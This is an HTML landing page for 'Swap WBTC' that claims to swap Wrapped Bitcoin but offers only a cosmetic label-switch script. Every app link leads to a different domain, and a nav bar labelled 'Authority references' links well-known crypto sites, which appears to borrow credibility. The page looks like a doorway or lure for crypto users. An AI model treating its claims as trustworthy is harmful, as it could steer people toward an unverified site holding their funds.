<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Swap WBTC</title>
  <meta name="description" content="Swap WBTC exchanges Wrapped Bitcoin for other cryptocurrencies in a few quick steps.">
  <link rel="canonical" href="https://swap-wbtc.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F4EF">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Swap WBTC">
  <meta property="og:description" content="Swap WBTC exchanges Wrapped Bitcoin for other cryptocurrencies in a few quick steps.">
  <meta property="og:url" content="https://swap-wbtc.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Swap WBTC">
  <meta name="twitter:description" content="Swap WBTC exchanges Wrapped Bitcoin for other cryptocurrencies in a few quick steps.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://swap-wbtc.github.io/#website",
        "url": "https://swap-wbtc.github.io/",
        "name": "Swap WBTC",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://swap-wbtc.github.io/#app",
        "name": "Swap WBTC",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://swap-wbtc.github.io/"
      },
      {
        "@type": "Organization",
        "@id": "https://swap-wbtc.github.io/#organization",
        "name": "Swap WBTC",
        "url": "https://swap-wbtc.github.io/",
        "logo": "https://swap-wbtc.github.io/favicon.png"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Swap WBTC home">
      <img src="simpleswap.png" width="30" height="30" alt="">
      <span>Swap WBTC</span>
    </a>

    <nav class="nav" aria-label="Authority references">
      <a href="https://bitcoin.org/en/" target="_blank" rel="nofollow noopener noreferrer">Bitcoin</a>
      <a href="https://ethereum.org/" target="_blank" rel="nofollow noopener noreferrer">Ethereum</a>
      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
    </nav>

    <span class="spacer" aria-hidden="true"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="Swap WBTC">
      <h1>Swap WBTC</h1>
      <p class="value"><strong>Swap WBTC</strong> exchanges Wrapped Bitcoin for other cryptocurrencies in a few quick steps.</p>
    </section>

    <section class="app-card" aria-label="Exchange route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img src="eth.png" width="28" height="28" alt="ETH">
            <span>ETH</span>
          </span>
        </div>

        <button class="switch" type="button" data-switch aria-label="Switch exchange direction">
          <span aria-hidden="true">&#8594;</span>
        </button>

        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img src="btc.png" width="28" height="28" alt="WBTC">
            <span>WBTC</span>
          </span>
        </div>
      </div>

      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
    </section>
  </main>

  <footer class="footer">Swap WBTC &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  }());
  </script>
</body>
</html>
